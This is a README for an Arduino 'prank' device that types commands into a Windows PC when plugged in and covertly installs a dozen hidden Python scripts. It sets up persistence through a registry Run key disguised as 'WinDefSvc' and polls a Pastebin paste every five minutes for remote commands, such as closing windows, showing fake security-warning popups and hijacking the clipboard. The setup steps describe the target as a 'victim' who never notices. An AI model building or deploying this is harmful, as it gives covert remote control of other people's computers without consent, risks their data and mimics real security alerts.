# Windows Ultimate Prank — Arduino Pro Micro / Leonardo

Silently installs 12 background prank scripts the moment it's plugged in. Nothing happens immediately — you trigger pranks remotely by updating a Pastebin paste whenever you're ready. Every prank interval is fully customizable from Pastebin at trigger time.

---

## Hardware Required

- Arduino Pro Micro **or** Arduino Leonardo
- USB cable (plug into target's Windows PC)

---

## Setup

### 1. Create your own Pastebin

1. Go to [pastebin.com](https://pastebin.com) and create a **free account**
2. Click **New Paste**
3. Leave the content **blank** for now (or type anything that isn't a command word)
4. Set expiry to **Never** and visibility to **Public**
5. Click **Create New Paste**
6. Copy the 8-character ID from the URL — e.g. `pastebin.com/raw/XXXXXXXX` → your ID is `XXXXXXXX`

### 2. Add your Pastebin ID to the sketch

Open `sketch.ino` and find this line:

```
typeln("'URL=''https://pastebin.com/raw/XXXXXXXX''' | ac $f");
```

Replace `XXXXXXXX` with your actual Pastebin ID.

### 3. Flash the sketch

1. Open `sketch.ino` in the Arduino IDE
2. Set **Tools → Board** to `Arduino Leonardo` or `Arduino Pro Micro`
3. Set the correct **Port**
4. Click **Upload**

### 4. Plug into target PC

- Plug the Arduino into the target Windows machine
- Wait ~10 seconds — a PowerShell window flickers briefly then closes
- All 12 prank scripts are now silently installed in `%APPDATA%`
- A hidden background watcher starts, checking your Pastebin every 5 minutes
- Remove the Arduino — the victim has no idea anything happened

---

## Triggering Pranks

Edit your Pastebin paste and save. The watcher checks every 5 minutes and launches the prank automatically.

### Command format

```
COMMAND
```
Uses the default interval for that prank.

```
COMMAND seconds
```
Runs the prank every N seconds. You control exactly how aggressive it is.

**Examples:**
```
MINIMISE 60        ← minimise every 60 seconds
VOLUME 30          ← spike volume every 30 seconds
SPEECH 45          ← speak every 45 seconds
ACTIVATE 120       ← launch all 12 pranks, each running every 2 minutes
JIGGLE             ← mouse teleport on default 60s interval
STOP               ← kill everything
```

### All commands

| Command | Default | What happens |
|---|---|---|
| `ACTIVATE` | each prank's own default | Launches **all 12 pranks** at once |
| `JIGGLE` | 60s | Mouse teleports to a random position |
| `MINIMISE` | 180s | Win+M minimises all windows |
| `SOUND` | 60s | Random Windows system beep |
| `NOTIFY` | 180s | Fake "Critical Error / Security Warning" popup |
| `CLIPBOARD` | 45s | Replaces clipboard with confusing messages |
| `ZOOM` | 90s | Ctrl+= zooms in on the screen |
| `CAPS` | 60s | Caps lock toggled |
| `VOLUME` | 60s | Volume randomly spiked up or down |
| `CLOSE` | 240s | Alt+F4 closes the foreground window |
| `SPEECH` | 120s | PC speaks: "Hi", "Message from PC"... |
| `DARK` | 300s | Dark/light mode flips |
| `SCROLL` | 45s | Wild random scroll jump |
| `STOP` | — | Kills all pranks, removes persistence, deletes all files |

---

## How Persistence Works

On first run, the watcher script (`%APPDATA%\.t.py`) adds itself to the Windows Registry Run key under the name `WinDefSvc`. It restarts automatically after every reboot until you send `STOP`.

---

## Stopping Everything

Put `STOP` in your Pastebin paste. Within 5 minutes the watcher will:
- Remove the `WinDefSvc` Registry Run key
- Kill all running `pythonw.exe` processes
- Delete all 13 hidden `.py` files from `%APPDATA%`

---

## Requirements on Target PC

- Windows 10 or 11
- Python must be installed (check with `python --version` in CMD)
- No pip installs needed — all pranks use only Python's built-in libraries (`ctypes`, `winsound`, `winreg`, `subprocess`)
